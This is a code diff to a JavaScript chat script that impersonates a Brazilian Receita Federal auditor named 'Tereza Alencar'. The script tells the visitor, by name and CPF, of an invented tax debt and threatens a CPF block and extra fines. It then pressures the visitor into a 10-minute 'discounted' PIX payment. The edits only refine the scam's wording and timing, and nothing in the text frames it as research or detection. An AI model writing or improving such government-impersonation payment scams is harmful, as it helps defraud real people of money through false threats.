@@ -322,24 +322,24 @@ const cpf = customerData.cpf || 'CPF não informado';
 const chatSequence = [
     {
         message: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
-        delay: 8000
+        delay: 3000
     },
     {
-        message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${fullName}.`,
-        delay: 15000,
+        message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}.`,
+        delay: 12000,
         requestPhone: true
     },
     {
-        message: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
-        delay: 14000
+        message: `Informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo sua movimentaçao PIX, cartões de crédito e atividades comerciais.`,
+        delay: 11000
     },
     {
-        message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 1.985,00 ao seu CPF, conforme determina a legislação tributária federal.`,
-        delay: 13000
+        message: `Se a dívida com a União não for quitada será aplicada uma multa adicional no valor de R$ 985,00 ao seu CPF, conforme determina a legislação tributária federal.`,
+        delay: 10000
     },
     {
-        message: `Importante: realizando o pagamento hoje há um desconto de 67%, reduzindo o débito de R$ 419,55 para apenas R$ 138,45. ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
-        delay: 12000,
+        message: `A Receita Federal tem um programa de regularização de débitos onde realizando o pagamento hoje há um desconto de 67%, reduzindo o débito de R$ 419,55 para apenas R$ 138,45. ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
+        delay: 10000,
         showOptions: 'debtOptions'
     }
 ];
@@ -401,9 +401,9 @@ function showOptions(optionsId) {
     if (optionsId === 'debtOptions') {
         optionsHtml = `
             <div class="chat-options">
-                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou quitar o débito agora mesmo', 'redirectToPayment')">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou quitar o débito agora', 'redirectToPayment')">
                     <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
-                    Vou quitar o débito agora mesmo
+                    Vou quitar o débito agora
                 </button>
                 <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Autorizo o bloqueio do meu CPF', 'confirmBlock')">
                     <i class="fas fa-times-circle" style="color: var(--receita-danger);"></i> 
@@ -434,7 +434,7 @@ function handleOptionClick(button, responseText, nextAction) {
     setTimeout(async () => {
         if (nextAction === 'redirectToPayment') {
             await showTyping(4000);
-            addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade após hoje.`, true, true);
+            addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade.`, true, true);
             
             await showTyping(5000);
             addMessage('Segundo as normas da Receita Federal, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa de não cumprimento do acordo no valor de R$985,00 e o CPF seguirá na lista de bloqueio.', true, true);
